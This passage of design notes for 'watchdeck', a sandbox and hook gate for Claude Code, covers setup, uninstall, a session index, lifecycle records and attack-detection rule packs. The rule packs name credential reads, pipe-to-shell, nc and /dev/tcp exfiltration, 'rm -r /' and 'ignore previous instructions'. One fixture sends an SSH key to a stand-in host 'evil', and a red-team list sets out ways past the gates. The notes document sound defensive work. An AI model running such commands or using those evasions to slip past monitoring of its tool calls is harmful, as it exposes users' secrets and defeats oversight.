  - Tests: `TestSetupConfirmsAndBacksUp` (decline leaves the file and no backup; accept writes it with a `.bak-<ts>` holding the original; a rerun changes nothing), `TestSetupNonTTYWithoutYes`, `TestSetupPluginOnlyAddsExclusion` (detector and `--plugin`), `TestSetupStopsWhenSelfTestFails`.
- **Sandbox self-test** (`runner.SandboxSelfTest`, `internal/runner/selftest_test.go`).
  - It compiles a profile through the same backend selection as `run`: network none, every write denied except in a fresh temp dir. It runs a canary under it: python3 if found on the PATH it hands the child, else `/bin/sh`.
  - The canary writes in its own dir (must succeed) and in a dir created under `/var/tmp` (must fail; the temp dirs are always writable, so they cannot be the target). With python3 it also connects to a listener the test opened on 127.0.0.1 (must fail).
  - Results come from the files left behind and from whether the listener saw a connection, not only from what the canary prints. Everything it creates is removed.
- **`watchdeck doctor [--json] [--plugin] [--exit-zero]`** prints pass/warn/fail lines and exits 1 on any fail. It checks:
  - the binary on PATH, and what `plugin/bin/hook.sh` would find;
  - each of the four settings files: hooks missing, incomplete, duplicated within the file, or pointing at a missing binary;
  - two files registering the hook, or naming different binaries (warn);
  - the plugin and a settings file both registering the hook (warn);
  - no registration at all (fail);
  - `sandbox.enabled` without the exclusion (fail);
  - the self-test. Inside another sandbox it is skipped as a warning; `/watchdeck:status` runs `status --plugin --exit-zero` there, which includes these checks (since 2026-10-19, section 10).
  - **Empirical double registration** (`TestDoctorDuplicateHooks`): two `decision` records with the same `tool_use_id` among the last 2000 decisions fail only when they are newer than the newest mtime of the settings files and the plugin registry it inspected. Older ones are history and at most a warning (`TestDoctorOldDuplicatesOnlyWarn`).
  - "Last hook seen" is the newest `decision`, `skill_invoked` or `denied` record.
  - JSON shape: `TestDoctorJSONShape`.
- **`watchdeck demo [--yes] [--no-open] [--keep]`**
  - It writes an embedded copy of `canary-request` (`internal/demo/canary`, byte-equal to `testdata/skills/canary-request`: `TestDemoEmbeddedMatchesTestdata`) into `/var/tmp/watchdeck-demo-*`, with its own HOME, XDG dirs, `CLAUDE_CONFIG_DIR` and activity log (`demo.Env.Environ`, `TestEnvironStaysInTheDemoTree`). It runs `probe.py net --strict` through `runner.Run` (`TestDemoDeniesNetwork`, darwin).
  - It offers `ui --detach --open --no-transcripts` with that same environment and the demo project as cwd, so the demo dashboard reads and writes only the demo tree (`TestDemoUICommandUsesTheDemoTree`).
  - The tree is removed at the end unless the dashboard was opened on it or `--keep` was given.
- **Config.** `internal/userconfig` reads and writes `ConfigDir/config.yaml` (0600, other keys kept). Since M5.3 setup asks the dashboard autostart question again and saves `ui.autostart` there; `uistate.EnsureRunning` reads it (see "Always-on dashboard (M5.3)").

Not verified yet (2026-10-13):
- The Linux paths of the self-test and the demo (bwrap, `/var/tmp`, loopback in an unshared network namespace); only `GOOS=linux go vet` ran.
- The `3: fix` band in an interactive session, including whether an exclusion in the user settings covers a `sandbox.enabled` that comes from a project file.
- The demo's browser hand-off: `ui --detach --open` on the demo tree.
- A type-check of `register.tsx` with `tsc`.

### One-command install and uninstall (2026-10-14)

Install, setup and uninstall are one command each.

- **`scripts/install.sh [--no-setup] [--yes]`.** After the checksum check and the install (default `~/.local/share/watchdeck/bin`, made absolute), it links `~/.local/bin/watchdeck` to the binary when `~/.local/bin` is on PATH and the install dir is not. It replaces a symlink there but never a regular file. Then it runs `watchdeck setup`:
  - `--yes`: `setup --yes </dev/null`, which needs no terminal.
  - With a terminal on stdout and an openable `/dev/tty`: `setup </dev/tty`. Under `curl | sh`, stdin is the script, so setup would otherwise see no terminal and write nothing.
  - Otherwise it prints `Next: watchdeck setup`.
  - A binary whose `help` has no `setup` (v0.1.0 archives) gets `Next: watchdeck enforce install` instead.
  - A declined or failed setup does not fail the install.
  - It ends with `To remove everything later: watchdeck uninstall`.
- **`watchdeck uninstall [--yes] [--purge] [--keep-binary] [--project] [--dry-run]`** (`cmd/watchdeck/uninstall.go`) first builds the whole plan without side effects and prints it, with paths under home shown as `~`. It then asks once. Without a terminal and without `--yes` it exits 1 having written nothing; `--dry-run` exits 0. Steps, in this order:
  1. stop the running dashboard (`uistate.Stop`); a failure here is only a warning;
  2. remove the login service through `service.Uninstall`, only when its plist or unit file exists, so a machine without one never runs launchctl or systemctl;
  3. unwrap every user-scope MCP server `mcp wrap` wrapped, in one `mcpconfig.WriteConfig`, which refuses a config that changed since it was read. The wrap records are dropped.
  4. `settings.Uninstall` on the user settings file, with a `.bak-<ts>` backup. The plan lists each entry through `settings.UninstallPlan`, the dry-run twin. `--project` also cleans `<git root>/.claude/settings.json`; without it, a project file that still has our hooks gets a `watchdeck enforce uninstall --project` hint.
  5. turn `ui.autostart` off in `config.yaml` when it is on;
  6. `--purge` only: delete `ConfigDir`, `StateDir` and `<cache>/watchdeck`. Each must be absolute and named `watchdeck`; the XDG bases themselves are never deleted. The state dir includes `mcp-backups`, so this also deletes the config backup that step 3 just wrote. Without `--purge`, the plan says that `overrides.yaml` and the activity log stay.
  7. last, delete the binary, but only when it sits in `~/.local/share/watchdeck/bin`, together with a `~/.local/bin/watchdeck` symlink that resolves to it (`--keep-binary` keeps both). The hooks and wrapped MCP entries name the binary's absolute path, so it goes after them. Any failure in steps 2–6 stops the run before the binary or the purge.
- **Never removed:** a binary anywhere else (Homebrew gets a `brew uninstall watchdeck` hint, others `rm <path>`), other tools' hooks and settings keys, the project settings file without `--project`, an activity log that `WATCHDECK_ACTIVITY` moves outside the state dir, the XDG base dirs, and the Claude Code plugin. When the plugin is installed, the plan prints `claude plugin uninstall watchdeck`.
- It ends with a one-line summary of what was removed and what was left.
- Exit codes are those of setup: 0 done or nothing to do, 1 declined or no terminal, 2 error, 3 usage.
- **Tests:**
  - `TestUninstallNoTerminalPrintsPlanWritesNothing`
  - `TestUninstallYesRemovesOurHooksOnly`: a foreign hook, `model` and another exclusion survive; one backup is written; autostart is turned off; a rerun has nothing to do.
  - `TestUninstallPurgeRemovesOwnDirsOnly`: siblings in the XDG bases survive.
  - `TestUninstallBinary`: outside the installer dir it stays, with an `rm` hint; Homebrew gets a hint; the installer dir and its link are removed after the hooks; `--keep-binary` keeps it.
  - `TestUninstallDryRunWritesNothing`, `TestUninstallProjectSettings`, `TestUninstallUnwrapsMCPServers`.
  - `scripts/test-install.sh`: every case runs with HOME, the XDG dirs, `CLAUDE_CONFIG_DIR` and `WATCHDECK_ACTIVITY` under its temp dir. Case 7 installs with `--yes`, checks the link and the hooks in the temp settings, then runs `uninstall --yes` and checks that the settings, binary and link are gone. Case 8 shows that a regular file in `~/.local/bin` is left alone.

Not verified yet (2026-10-14):
- The interactive `setup </dev/tty` path under a real `curl | sh`.
- `uninstall` against a running dashboard or an installed login service; the steps are covered only through the library tests of `uistate.Stop` and `service.Uninstall`.
- The Linux run of `test-install.sh`.

### Session index (M5.4, 2026-10-13)

**Reversed decisions.** M4 kept two rules: the whole `~/.claude/projects` tree is never scanned, and nothing derived from a transcript is stored. M5.4 reverses both, on the owner's choice ("everything, full read"). `transcript.DiscoverAll` lists `projects/*/<id>.jsonl` and each session's `<id>/subagents/agent-<id>.jsonl`. It uses directory listings and Stat only, with the same checks as `Discover`: a project dir must resolve to a direct child of the projects dir, a session file must resolve to `<root>/<dir>/<id>.jsonl` with a valid id before and after symlink resolution, and subagent dirs and files must resolve under the root. Two names for one file give one session, keyed by the resolved file's id. `Discover` itself is unchanged. The development rule is also unchanged: never open the owner's real `~/.claude/projects`. Tests use temp copies of the fixtures and synthetic sessions (`TestDiscoverAllFixtures`, `TestDiscoverAllRefusesOutsideAndDedupes`, `TestSymlinkOutsideProjectsRefused`).

**Location and permissions.** `internal/sessionindex` stores the index in `<stateDir>/index/` (`paths.SessionIndexDir()`):

- `meta.json` holds one entry per session.
- `text/<sha256(id)>.txt` holds the session's search text. The name is the lowercase hex sha256 of the id, so ids that differ only in case stay two files on a case-insensitive filesystem (`TestIDsDifferingInCase`). `meta.json` version 2 introduced this naming; a version-1 index is rebuilt and its old files removed (`TestOldVersionMetaRebuilds`).
- `.lock` is the `flock` that `Update` holds.

Directories are 0700; an existing looser directory is tightened. Files are 0600. `meta.json` and every rebuilt text file are written to a temp file and renamed. Growth is appended in place, and `meta.json` records `text_bytes`. If the next update finds a text file longer than `text_bytes` (a crash between the append and the meta save), it truncates the file back. A shorter or missing text file rebuilds that entry. So text is never duplicated. Tests: `TestPermissions`, `TestCrashAfterAppendReconciled`.

**Sandbox deny (M5.3, pulled forward into M5.4 on 2026-10-13).** The index is a derived copy of transcript text, so skill scripts must not reach it. `run` adds watchdeck's whole state dir, `paths.Resolve(home, env).StateDir` (`${XDG_STATE_HOME:-~/.local/state}/watchdeck`), to the profile's deny paths. On macOS it is denied for both read and write, as the built-in deny paths are; on Linux it is hidden with a tmpfs. bwrap can only hide a path that exists, so `run` creates the state dir (0700) before compiling the profile on both backends; otherwise a child whose cwd or write grant covered a missing state dir could create it and plant files there (a symlinked `activity.jsonl`, an `index/.lock`, a forged `meta.json`). As a second layer, the activity log append and the index lock and text-append opens use `O_NOFOLLOW`, so a symlink at those paths is refused, not followed (`TestAppendRefusesSymlink`, `TestLockRefusesSymlink`). The state dir must resolve to an absolute path, or `run` stops with a policy error (exit 125) rather than run without the deny (`TestStateDenyFailsClosed`). A manifest or override write entry under it is dropped with a warning, like one under `~/.ssh`. The deny is added by `runner.Resolve` outside the manifest, so no manifest can remove it. The activity log lives in the same dir by default, and logging still works: `run` appends its record from the parent process after the child exits, outside the sandbox. A log moved by `WATCHDECK_ACTIVITY` to a path outside the state dir is not covered. Tests: `TestSandboxDeniesStateDir` (real Seatbelt, default and `XDG_STATE_HOME` state dirs: reading an index file and writing into the dir are denied, a cwd write is allowed, and the run record is written into the denied dir; with the deny removed the test fails), `TestToResolvedDeniesStateDir`, `TestStateDenyFollowsXDG`. Linux: designed, not run.

**Per session**, the index keeps:

- the id, project dir and path;
- the size, mtime and resume offset, for the main file and for each subagent file;
- the real `cwd` (taken from the rows, not unescaped from the dir name), `git_branch` (the latest seen), `models[]`, `cc_version` and `entrypoint`;
- `first_ts` and `last_ts`;
- `title`: the first typed prompt, at most 240 bytes. Rows that are `isMeta`, tool results, or `<command-…>`, `<local-command-…>` or `<bash-…>` text are skipped;
- `turns`, `tool_calls` and `subagents`;
- `skills[]`, from `Skill` tool_use inputs and from the `--skill` names in a `hook_success` rewrite;
- `truncated`, which is set when either `tail_read` or `text_capped` is.

Tests: `TestFixtureATitleAndMetadata`, `TestTitleSkipsCommandAndMetaRows`, `TestCrossProjectListing`.

**Incremental update.**

- Size and mtime unchanged: the session is skipped.
- Grown: reading resumes at the stored offset, which is the position after the last complete line. A final line without a newline is read again next time. Growth is detected by size and mtime only: a file rewritten in place to a larger size is taken as an append, and the rows before the old offset are not re-read. Claude Code only appends to transcripts, so this is accepted rather than detected; `index sessions --rebuild` re-reads everything.
- Shrunk, mtime gone backwards, or a subagent file shrunk or vanished: the entry is rebuilt.
- Transcript gone: the entry and its text file are pruned.
- The same session id in two project dirs: the newest mtime wins, and the other is counted as a duplicate.

Tests: `TestIncrementalAppend`, `TestShrinkRebuilds`, `TestMtimeBackwardsRebuilds`, `TestSubagentGrowthAndRemoval`, `TestPrune`, `TestDuplicateIDNewestWins`.

**Bounds.** Lines are streamed by `transcript.LineReader`, now shared with `Load`, and lines over 2 MiB are skipped and counted. A file over 32 MiB is read in two parts: its head, up to 4 MiB and for metadata only, then its last 32 MiB (`tail_read`). This applies to the first read only; later growth is read in full from the stored offset and is bounded by the per-session text cap below. The tail start is computed from the size when the file is opened; rows appended during the read are read too, and the stored offset covers them. If watchdeck dies during a rebuild (tail-read or not), before `meta.json` is saved, nothing of that read is kept. An unfinished temp text file is removed. A text file already renamed into place has no entry in `meta.json`, because a rebuild of a session that already has an entry first saves `meta.json` without it, and `--rebuild` first saves an empty `meta.json`. The next update therefore reads the session afresh (for a large file, a new head-and-tail read at its new size) and never reconciles the new text against the old entry. Tests: `TestCrashBetweenRenameAndMetaSave` (a tail-read session, grown and rebuilt, killed between the rename and the save: the next update's text and entry equal a fresh index's), `TestCrashDuringFullRebuild`. Each fails with its save removed. The bytes between the head and the tail are never indexed, and a crash does not change that. Test: `TestSparseLargeFileHeadAndTail`, which builds a 33 MiB sparse file.

The search text holds every text part of every row, one part per line:

- user prompts;
- assistant text;
- plain-text thinking when present;
- every string value of tool inputs;
- tool results;
- hook stdout;
- summary and system text.

Each session's text is capped at 16 MiB (`Options.TextCap`), and a capped session is marked `text_capped`. `Options.NoTranscripts` indexes nothing and creates nothing. Tests: `TestPerSessionCap`, `TestNoTranscriptsWritesNothing`, `TestSessionsNoTranscriptsWritesNothing`.

**Search.** `Index.Search(q, limit)` finds a case-insensitive substring and returns one hit per session, newest first: `{session_id, snippet ≤ 240 bytes, offset}`. It scans the text files in parallel with at most 8 workers, reading 1 MiB chunks with an overlap so that a match across a chunk boundary is still found. An ASCII query uses a byte-wise fold. Any other query uses a `(?i)` RE2 regexp compiled per call; this is simple case folding, so `ß` does not match `SS`. Tests: `TestSearchHitsSnippetsAndOffsets`, `TestScanAcrossChunks`, `TestSearchNonASCIICaseInsensitive`, `TestSnippetBounds`.

**Benchmarks.** Measured 2026-10-13 on an Apple M3 Max with darwin arm64, `-benchtime 5x`, on 1000 synthetic sessions of about 40 rows each, spread over 10 projects:

| Benchmark | Time | Allocated |
| --- | --- | --- |
| `BenchmarkIndex1000Sessions` (cold) | 323 ms | 187 MB total |
| `BenchmarkUpdateUnchanged1000Sessions` | 38 ms | 20 MB total |
| `BenchmarkSearch1000Sessions`, ASCII query | 10–11 ms | 1.1 MB |
| `BenchmarkSearch1000Sessions`, non-ASCII query | 29 ms | 1.1 MB |

Search is far under the plan's 1 s threshold, so no token index is needed.

**CLI.** `watchdeck sessions [--project P] [--since D] [--search Q] [--limit N] [--json] [--no-transcripts]` refreshes the index, then lists the sessions (M5.5 adds `--state` and `--denials`; see "Sessions page (M5.5)"). `watchdeck index sessions [--rebuild | --purge] [--json]` refreshes, rebuilds or deletes it. `Purge` removes only a directory named `index`. Tests: `TestSessionsCLI`, `TestPurge`.

**Not yet done.**

- Wired into the dashboard in M5.5 ("Sessions page (M5.5)"): one owner goroutine refreshes it every 15 s and on lifecycle changes.
- Not verified:
  - a real, non-sparse transcript over 32 MiB;
  - two real processes updating at once. Four in-process `Index` values racing with a transcript writer are tested (`TestConcurrentUpdatesDoNotCorrupt`, which fails with the `flock` disabled); each takes the lock on its own descriptor and rereads `meta.json` under it;
  - Linux, where the code is not yet run;
  - RSS under load, against the plan's < 64 MiB target.
### Built-in rule packs (M6.2, 2026-10-13; wired into the hook by M6.3, 2026-10-14)

`internal/rules` holds attack rule packs as data. The source of truth is YAML under `internal/rules/packs/*.yaml`, each pack `{pack, version, description, enabled?, rules}` and each rule `{id, tool, match{field?, regex?, literals?, argv0?, anchored?}, severity, action, description, fp_note}`. `go generate ./internal/rules` runs `internal/rules/gen`, which validates every pack (regexes included) and writes `packs_gen.go`: the packs as plain slice and struct literals, so the hook never parses YAML and the package stays init-free. `gen`'s `TestGeneratedUpToDate` regenerates in memory and fails if the file is stale; `TestRuntimePacksMatchYAML` compares rule by rule. Packs are **gates**, not sandbox: `rules.Eval(cfg, tool, input)` only reports hits (`pack`, `version`, `rule`, `field`, `severity`, `action`, `description`; never the matched text, so a hit on a key never echoes the key). Nothing calls it yet; M6.3 wires it into `hook.decide`, where an ask hit becomes a PreToolUse decision and nothing becomes an allow.

**The packs are advisory.** Owner decision, 2026-10-13: every rule's default is `log` or `ask`, never `deny`, until the owner has reviewed the packs (`TestNoDenyDefaults`). The lexical matching below misses many spellings (see "Known gaps"), so a pack hit is a prompt or a record, not a control. Enforcement is the OS sandbox (`watchdeck run`) and the M6 gates on paths, domains, MCP tools and agents; a person can still raise a rule to `deny` through `Config`.

| Pack | Rules | ask | log |
|---|---|---|---|
| `secrets-read` | 10 | `cat`/`base64`/`cp`… of `~/.ssh/id_*` or `~/.aws/credentials` (Bash), and the Read tool on the same two files | `.env` (not `.env.example`/`.sample`), `~/.netrc`, gcloud/kube/docker/gh/azure credentials, `security find-*-password -w`, Read of `.env` and the others |
| `pipe-to-shell` | 3 | `curl/wget … \| sh`, `bash <(curl …)`, `sh -c "$(curl …)"`, `eval "$(curl …)"` | `curl … \| python3` (stdin as script) |
| `exfil` | 6 | curl/wget upload (`-d/-F/-T/--data*`) of an SSH key or AWS credentials; scp/sftp and rsync of those (or `~/.ssh`) as a source to `host:` | `curl -d @file`, pipes/redirects to `nc`/`socat`/`/dev/tcp`, base64 into a network tool |
| `destructive` | 4 | `rm -r` of `/`, `/*`, `~`, `$HOME`, a home dir or a top-level system dir; `mkfs*`/`newfs*`/`wipefs`, `diskutil erase*`, `dd of=/dev/disk…` | |
| `git-force-main` | 4 | `push --force/-f` or `+refspec` to `main`/`master` | `--force-with-lease` to main, deleting main |
| `persistence` | 7 | | shell rc files (Bash redirect/tee/`sed -i`, and Write/Edit `file_path`), LaunchAgents/Daemons, `crontab -`/`crontab file`, systemd user units |
| `cred-in-write` | 4 | AWS key ids, PEM private key headers, GitHub tokens, Slack tokens in Write/Edit/MultiEdit/NotebookEdit content | |
| `prompt-injection` | 3 | | WebFetch/WebSearch result text (PostToolUse): "ignore previous instructions", chat-template/hidden markers, invisible Unicode. **Off by default.** |

A Bash command longer than 256 KiB also gets a synthetic `ask` hit, `builtin/input-too-large`, that `Config` cannot turn off.

**False-positive policy.** New rules ship as `log` for a release before promotion. `ask` is used for reads or uploads of the two hard credential files, `rm -r` of a root, and where a legitimate minority exists (documented installers piped to a shell, a solo owner force-pushing main, fixtures with fake keys, formatting a USB stick). Every rule's `fp_note` names the honest use that argues against a stricter default. `internal/rules/testdata/<pack>/{hit,miss}.yaml` holds at least one hit and one miss per rule (`TestFixtures` fails otherwise), and `testdata/fp-corpus.txt` (≈70 everyday commands: `git push origin feature`, `cat .env.example`, `grep -r env src/`, `rm -rf ./build`, `curl -o file url`, `echo >> README.md`, `ssh-keygen -l -f`, …) must give zero ask hits under the default config (`TestFalsePositiveCorpus`). Key-shaped fixture values are assembled in the test (AWS's documented example key id, PEM headers with no key, `FAKE`/`0`-padded tokens), so no file holds one.

**Matching.** Lexical, over the raw input. A Bash command is scanned whole up to 256 KiB (`rules.MaxCommand`, lowered from 1 MiB on 2026-10-13 after measuring), so padding cannot push the dangerous part past the cap; above that, the `input-too-large` ask fires. Write/Edit content, WebFetch text, URLs and file paths are cut at 64 KiB (`rules.MaxInput`); text past that cap, such as the tail of a large Write, is not scanned. RE2 is linear-time, so the caps bound cost rather than guarding against ReDoS. Before matching, a backslash-newline in a command becomes a space, and a file path is cleaned (`path.Clean`, so `//`, `/./` and `..` do not hide a path). Tests: `TestOversizeCommandAsks`, `TestContinuationLineMatchesSingleLine`, `TestFilePathCleaned`; `FuzzEval` checks that no input panics. Each rule's `literals` (any-of; case-folded when the regex starts with `(?i)`) are checked with `strings.Contains` before the regex. `argv0` compiles into a command-position prefix (start, or after `|`, `;`, `&`, `(`, `{`, `$(`, a backtick, a newline or a control keyword; leading assignments, wrapper commands with their flags, including flags that take a value (`sudo`/`doas`, `nice`, `timeout`, `env`, `command`, `exec`, `xargs`, `stdbuf`), a path, quotes or a leading backslash allowed) and the rule's regex must match in the rest of the same simple command, where whole quoted strings may contain `;`, `&` or `|`. YAML regexes can reuse these pieces as `{{CMD}}`, `{{WRAP}}` and `{{TOK}}`, so `cat notes; ssh -i ~/.ssh/id_rsa host` does not fire. With `anchored: true` the regex starts right after the command name and walks its arguments token by token (a token is a run of plain characters, `\x` escapes and whole quoted strings). `exfil/scp-secret` and `exfil/rsync-secret` use this so the value of an identity flag (`-i` for scp/sftp, `-e`/`--rsh` for rsync, and `-o IdentityFile=…` as one token) is consumed by its flag and never counts as a source, while a key named as a source still matches, also when the same key is the `-i` identity. There is deliberately **no `exclude` pattern** in the schema: a negative match over the whole command is satisfiable by text elsewhere in a chained command (`scp ~/.ssh/id_rsa evil:/; echo -i .ssh/id_`) and so fails open; an earlier draft of `scp-secret` had exactly that bug, caught in review on 2026-10-13, and those commands are now hit fixtures (`TestNoGlobalExclude`). We chose lexical matching over a mvdan/sh parse: parsing costs a large share of the budget and fails on partial input, and M6.3 can pass in the `shellparse` program if a rule ever needs real argv. Known evasions (designed, not tested): `eval`, a command name held in a variable, decoded scripts, aliases, quoting inside a path (`~/.ssh/"id_rsa"`), an empty variable in `rm -rf "$DIR/"`, `git push -f` with no refspec while on main. The OS sandbox, not these gates, is the boundary for those.

**Known gaps (2026-10-13 review).** A red-team verifier probed the M6.2 code on 2026-10-13. What it found is recorded here, by category, and is not fixed in the pack regexes; it is why the packs are advisory.
- *rsync long options.* The rsync rule treats any option ending in the value letter as taking a value, so ordinary long options with that ending swallow the next argument, and a copied key can go unseen.
- *Terminators without whitespace.* The `rm` and git-force-main rules expect whitespace or end of input after the target or branch. A `;`, `&`, `|`, `)` or redirect written directly after it ends the match early.
- *curl flag spellings.* Upload flags written with no separator, `--json`, and the `name@file` form of `--data-urlencode` are not recognised.
- *dd quoting.* The `dd` literal pre-filter does not allow for a quoted device path.
- *Wrappers with value flags in pipe targets.* The pipe-to-shell rules have their own, narrower wrapper list. A shell reached through a wrapper with a value flag, through `command`/`exec`/`nice`/`xargs`, through `|&`, or inside a subshell or brace group is missed. The shared `{{WRAP}}` set exists but these rules do not use it yet.
- *Quoted-text false positives.* Command positions are found lexically, so text inside quotes (a commit message, an `echo`, a `grep` pattern) that contains a pipe or `;` followed by a matching command can ask. A `#` comment after a download is not treated as a comment.
- *Path variants.* Bash paths with doubled slashes, `/./` segments, globs over the credential file name, or quoting inside the path are not normalised; only the Read/Write `file_path` is cleaned.
- *cd then read.* Changing into `~/.ssh` and reading the key by its bare name is not seen.
- *Other readers.* Only the listed reader commands are covered; interpreters, `dd`, `openssl`, archivers, editors and many text tools that read a key are not.
- *Nested shells.* A command inside `bash -c '…'`, `eval`, a variable or a loop is matched only if its text happens to sit at a command position.
- *Download-then-run.* Saving a script and running it in a second command, or a downloader other than curl/wget, is not pipe-to-shell to these rules.
- *Directory reads.* Recursive reads or archives of a whole credential directory, `find … -delete` on a root, and sftp batch input are not covered.

**Config.** `rules.Config{Packs map[pack]PackConfig, Rules map["pack/id"]RuleConfig}`, each `{enabled, action}`; in YAML a pack or rule is `on`/`off`/a bool or `{enabled, action}` (`packs: {prompt-injection: on, exfil: {action: ask}}`, `rule_overrides: {destructive/mkfs: {action: log}}`). A rule override beats its pack's; `Config.Validate` reports unknown packs, rules and actions. The v2 policy file (M6.1) maps onto it.

**Cost (2026-10-13, darwin arm64, `go test -bench`, three runs).** Warm `Eval` on a typical Bash command 16.0–16.3 µs/op (3 allocs); a command that fires five packs 127 µs/op; both under the 200 µs budget. The first call in a process builds the matchers from `packs_gen.go`: 15.5–15.9 µs (`BenchmarkColdLoad`, 37 KB, 324 allocs); the first `Eval` on a typical Bash command, including the regex compiles its pre-filters let through (through `internal/lazyre`), is 123 µs (`BenchmarkColdFirstEval`). Parsing and validating the YAML instead would cost 2.4 ms (`BenchmarkYAMLParse`); before the generator, the runtime parse alone was 1.40 ms, over the ~1 ms rule in CONTRIBUTING. `HasRules` costs the same 16 µs load and no parsing. Worst case at the cap (2026-10-13, one run, warm): a benign 256 KiB command costs 96–231 ms depending on content, against 380–900 ms at 1 MiB, so the cap bounds a single hook call near a quarter second; longer commands get the `input-too-large` ask. The package is init-free (`TestPackageIsInitFree` in `internal/rules`; `GODEBUG=inittrace=1` on its test binary lists no watchdeck package).

### Session lifecycle (M5.2, 2026-10-13)

The dashboard needs to know which sessions are open. The hook now also takes three lifecycle events and records them in two places under the state dir, separate from the activity log. A Bash command that touches no skill gets no lifecycle record; an auto-mode denial of it is recorded in the activity log by program name only (`TestDeniedBashKeepsArgv0Only`).

**What the hook receives.** Captured 2026-10-13 from one `claude -p` session (Claude Code 2.1.296) with a temp `--settings` file and matcher-less groups, scrubbed into `internal/transcript/testdata/e2e-canary/lifecycle-stdin.jsonl` (provenance in that directory's README):

- `SessionStart`: `session_id transcript_path cwd hook_event_name source` (`startup` here).
- `UserPromptSubmit`: `session_id transcript_path cwd prompt_id permission_mode hook_event_name prompt`. `prompt` is the prompt text; `hook.Input` has no field for it and no record holds it (`TestLifecycleEventsFromCapture`).
- `SessionEnd`: `session_id transcript_path cwd prompt_id hook_event_name reason` (`other` for a finished `-p` session).

No pid is on any of them, and the hook's parent is a shell, so liveness does not use pids.

**Records.** `<stateDir>/sessions.jsonl` (`paths.Sessions`), JSONL, 0600, dir 0700, opened with `O_NOFOLLOW` for append and read, renamed to `sessions.jsonl.1` past 4 MiB (the previous `.1` is replaced). One line per record, schema v1:

```json
{"v":1,"kind":"start","ts":"2026-10-13T22:05:20.568648Z","session_id":"…","transcript_path":"…","cwd":"/Users/you/proj","source":"startup"}
```

`kind` is `start` (SessionStart, with `source`), `end` (SessionEnd, with `reason`) or `beat` (UserPromptSubmit). No other key is ever written (`TestRecordKeys`). `transcript_path` and `cwd` are cut to 4 KiB on a UTF-8 boundary (`TestFieldsCapped`). Rotation (size check and rename) happens only under an exclusive `flock` on `sessions.jsonl.lock` (0600), so two hooks never both rename and lose the rotated file; the append itself is one `O_APPEND` write. The lock is tried without blocking for about 100 ms; when it stays busy the append goes ahead unrotated (`TestConcurrentRotationLosesNothing`, which fails with the lock removed).

**Marker.** `<stateDir>/live/<session_id>` (`paths.LiveDir`), 0600 in a 0700 dir. Created on start (and by a beat when missing, for a hook installed mid-session), removed on end. Its content is `{"logged":"<ts of the last start/beat record>","transcript_path":…,"cwd":…}`; it is written to a temp file and renamed, so a symlink planted at the name is replaced, not followed. Every other hook event the binary receives for that session (PreToolUse, PermissionDenied) only sets the marker's mtime with `os.Chtimes`; it never creates a marker, never appends, and does not change the PreToolUse decision (`TestOtherEventsTouchMarker`). A live dir that is a symlink, or a marker that is not a regular file, is refused (`TestSymlinkedLiveDirRefused`, `TestSymlinkedMarkerNotFollowed`, `TestSymlinkedLogRefused`). Every open of the marker, the log, its `.1` and the lock uses `O_NOFOLLOW|O_NONBLOCK` and refuses a non-regular file after `fstat`, so a FIFO planted there cannot block the hook (`TestFIFONeverBlocks`, `TestLifecycleFIFODoesNotBlockHook`; also checked by hand on 2026-10-13 with `mkfifo live/<id>` and the built binary: UserPromptSubmit returned at once, exit 0, no output). A `live/.tmp-*` left by a hook killed between create and rename is removed by a later Start once it is over an hour old (`TestStartPrunesOldTmp`).

**Beats are cheap.** A beat appends a record only when the marker's `logged` stamp is at least 60 s old; otherwise it only touches the marker. The throttle counts from the last appended record, not the mtime, so tool calls in between do not postpone it (`TestBeatOnlyTouchesWithinBeatEvery`).

**Session ids.** A session id must pass `transcript.ValidID` and must not start with a dot; anything else writes nothing (`TestInvalidSessionIDRejected`, `TestLifecycleInvalidSessionID`).

**States.** `lifecycle.Store.State(id)` and `List()`:

- **ended**: the session's last record is an end record. The last record wins, not "any end record", because `--resume` reuses the session id: SessionEnd of the old process, then SessionStart with `source: resume` (designed from the hooks docs; the resume sequence was not captured).
- **live**: the marker exists and its mtime is under 10 min old (and not more than 1 min in the future: a marker dated ahead is idle, `TestFutureMtimeIsNotLive`), or the transcript's mtime is under 30 s old (Stat only; the transcript is never opened by this package; `Store.NoTranscriptStat` turns the Stat off, for `--no-transcripts`).
- **idle**: the marker exists and is older.
- **unknown**: no marker and no end record.

Both `sessions.jsonl` and `.1` are read. Test: `TestStateTransitions` (fake clock: live, idle, live from the transcript, idle, live after a touch, ended, ended despite a hand-made marker, live after a resume), `TestListAndCounts`, `TestRotation`.

**Dispatch.** `hook.Run` routes the three events to the store before any decision, inside the existing panic guard, prints nothing (SessionStart and UserPromptSubmit stdout would become model context) and exits 0. `WATCHDECK_LIFECYCLE=off` empties `paths.Sessions` and `paths.LiveDir`; the zero `Store` touches nothing (`TestOffNeverOpensFiles`, `TestLifecycleOffWritesNothing`, `TestLifecycleOff`). The lifecycle follows `XDG_STATE_HOME`, not `WATCHDECK_ACTIVITY`. `run` already denies the whole state dir to sandboxed scripts, which covers both files.

**Extension point.** `lifecycle.OnSessionStart` is a nil `func(Store, Record)` the hook calls after a start is recorded, inside the panic guard; M5.3 uses it to start the dashboard. Nothing sets it in M5.2 (`TestOnSessionStartIsNil`, `TestOnSessionStartCalledAfterStart`).

**Registration.** `enforce install`, `setup`, the Enforce page and `plugin/hooks/hooks.json` register six groups. The three lifecycle groups carry no `matcher` key, so every SessionStart source and SessionEnd reason arrives; `claude plugin validate plugin --strict` passes with them. An M4 install is upgraded: a new install adds the lifecycle groups (appended to the existing `SessionStart` array), widens its `Bash|Skill` PermissionDenied matcher in place and leaves every other existing group byte-identical, and uninstall returns the file to its state before any install (`TestUpgradeFromM4`, fixture `internal/settings/testdata/m4-installed.json` generated by the M4 code). `settings.Status` gains `StartHook`, `EndHook`, `PromptHook`, and `Complete` needs all six plus the exclusion, so an M4 install shows as partial until upgraded. An M4 settings install shows Hook partial and doctor warns until you rerun `watchdeck enforce install` (or `watchdeck setup`); plugin users get the new hooks with the plugin update. The dashboard header's tooltip says so when only the lifecycle hooks are missing. `doctor` reports a file missing only lifecycle hooks as a warning that names them (the generic "n of 6 hooks, missing …" line since 2026-10-19; a separate M4 line could not fire for a real M4 file, whose `Bash|Skill` PermissionDenied group also counts as missing until `enforce install` migrates it), and adds a `sessions` check with live, idle and ended counts (`TestDoctorLifecycle`). Tests: `TestInspectReportsEveryHook`, `TestUninstallLifecycleKeepsForeign`, `TestPluginHooksJSONShape`.

**Measurements** (2026-10-13, `scripts/measure-hook.sh` with BEFORE at the revision before M5.2, darwin arm64, go1.27.2, 200 spawns per payload, three runs, machine not idle; medians, ms; BEFORE has no opinion on the lifecycle events):

| Payload | before | after |
| --- | --- | --- |
